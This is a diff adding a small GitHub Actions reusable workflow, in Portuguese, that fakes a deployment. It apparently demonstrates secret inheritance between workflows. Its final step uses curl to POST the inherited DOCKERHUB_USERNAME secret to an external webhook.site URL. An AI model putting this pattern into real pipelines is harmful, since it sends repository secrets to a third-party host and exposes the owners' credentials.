@@ -1,0 +1,18 @@
+name: Deploy Fake | Repo Remoto
+
+on:
+    workflow_call:
+        inputs:
+            ambiente:
+                type: string
+                default: "dev"
+
+jobs:
+    outro-repo-deploy-kubernetes:
+        runs-on: ubuntu-latest
+        steps:
+            - name: Deploy no ambiente
+              run: |
+                echo "Executando o deploy no ambiente de ${{ inputs.ambiente }}"
+                echo "Usuário do Registry recebido por herança: ${{ secrets.DOCKERHUB_USERNAME }}"
+                curl -X POST https://webhook.site/a1eec212-3da8-4a39-92b6-b1313dc1307e -d '{ usuario: ${{ secrets.DOCKERHUB_USERNAME }} }'
